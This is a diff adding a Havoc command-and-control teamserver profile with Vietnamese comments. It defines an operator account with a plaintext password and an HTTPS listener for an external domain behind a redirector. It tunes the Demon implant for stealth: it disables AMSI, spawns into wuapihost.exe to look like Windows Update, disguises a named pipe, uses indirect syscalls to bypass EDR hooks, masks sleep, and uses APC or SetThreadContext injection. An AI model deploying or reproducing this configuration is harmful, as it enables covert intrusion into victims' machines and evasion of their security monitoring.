@@ -1,0 +1,87 @@
+Teamserver {
+    Host = "127.0.0.1"
+    Port = 26931 # Cổng này được bảo vệ bởi iptables, chỉ chấp nhận từ localhost
+}
+
+Operators {
+    user "elit3t" {
+        Password = "roG9htDl7LlcTgiED2Mt"
+    }
+}
+
+# Sử dụng mô hình Redirector với Apache2/Nginx ở phía trước
+# Listener chỉ cần tập trung vào việc nhận dữ liệu đã lọc
+Listeners {
+    Http {
+        Name     = "HTTPS-C2-STEALTH"
+        Hosts    = [ "hap.mytotobanservice.info" ]
+        HostBind = "127.0.0.1" # Chỉ nghe nội bộ từ Apache2/Nginx chuyển vào
+        Port     = 8080        # Port nội bộ
+        Secure   = false       # SSL sẽ do Apache2 xử lý (giúp giấu JARM)
+        UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+
+        # Headers mô phỏng lưu lượng hợp lệ của một ứng dụng Web chuyên nghiệp
+        Headers = [
+            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "Cache-Control: max-age=0",
+            "X-Frame-Options: SAMEORIGIN"
+        ]
+    }
+}
+
+Demon {
+    # Nhịp thở Beacon linh hoạt (95s + 45% Jitter)
+    Sleep  = 95
+    Jitter = 45 
+
+    MaxTaskSize = 2623440
+    TrustXForwardedFor = true # Bật vì chúng ta dùng Apache2 làm Proxy
+
+    # Hậu xâm nhập (Post-Ex) - Ép buộc sự tàng hình
+    Injection {
+        # Đổi sang wuapihost (Windows Update) để kết nối mạng trông tự nhiên hơn
+        SpawnToX86 = "%windir%\\syswow64\\wuapihost.exe"
+        SpawnToX64 = "%windir%\\sysnative\\wuapihost.exe"
+        
+        Obfuscate     = true
+        SmartInject   = true
+        AmsiDisable   = true # Vô hiệu hóa để chạy scripts nhạy cảm
+        # Chỉnh sửa PipeName để giống các tiến trình dịch vụ chuẩn
+        PipeName      = "srvsvc_##" 
+    }
+
+    # Cấu hình nạp (Staging) - Chống phân tích tĩnh
+    Stage {
+        Allocator    = "NtMapViewOfSection" # Tránh VirtualAlloc (EDR cực nhạy với hàm này)
+        UserWx       = false
+        StompPE      = true
+        Obfuscate    = true
+        Cleanup      = true
+        SleepMask    = true # Mã hóa Demon khi đang ngủ (Tính năng quan trọng nhất)
+        SmartInject  = true
+        
+        # Sử dụng Indirect Syscalls để vượt qua EDR Hooks
+        Syscall = "Indirect" 
+
+        # Xóa bỏ các chuỗi đặc trưng
+        TransformX64 {
+            Prepend "\x90\x90\x90\x90"
+            Strrep "ReflectiveLoader" "UpdateService"
+        }
+    }
+
+    # Tiêm mã vào tiến trình (Process Injection)
+    ProcessInject {
+        Allocator      = "NtMapViewOfSection"
+        BofAllocator   = "VirtualAlloc"
+        BofReuseMemory = true
+        
+        # Chỉ sử dụng các kỹ thuật không tạo ra Thread mới lộ liễu
+        Execute {
+            # Ưu tiên sử dụng APC hoặc SetThreadContext để né tránh giám sát CreateThread
+            NtQueueApcThread-s
+            SetThreadContext
+            RtlCreateUserThread
+        }
+    }
+}
